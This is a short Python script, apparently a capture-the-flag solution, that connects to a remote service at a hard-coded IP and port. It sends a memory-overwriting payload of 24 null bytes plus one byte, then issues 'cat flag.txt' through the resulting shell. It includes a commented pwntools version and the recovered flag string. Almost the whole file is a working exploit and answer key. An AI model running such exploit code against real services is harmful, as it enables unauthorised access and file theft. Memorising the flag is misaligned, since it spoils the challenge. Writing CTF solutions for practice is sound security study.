# import pwn

# io = pwn.remote('34.123.210.162', 20234)
# payload = b'\x00' * 24 + b'\xcb'
# io.sendlineafter(b'name?:', payload)
# io.interactive()

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('34.123.210.162', 20234))

data = s.recv(1024).decode()
print("Received: {}".format(repr(data)))

payload = b'\x00' * 24 + b'\xcb'
s.send(payload)
s.send('\n'.encode())

data = s.recv(1024).decode()
print("Received: {}".format(repr(data)))

s.send(b'cat flag.txt')
s.send('\n'.encode())

data = s.recv(1024).decode()
print("Received: {}".format(repr(data)))

# poctf{uwsp_71m3_15_4_f4c702}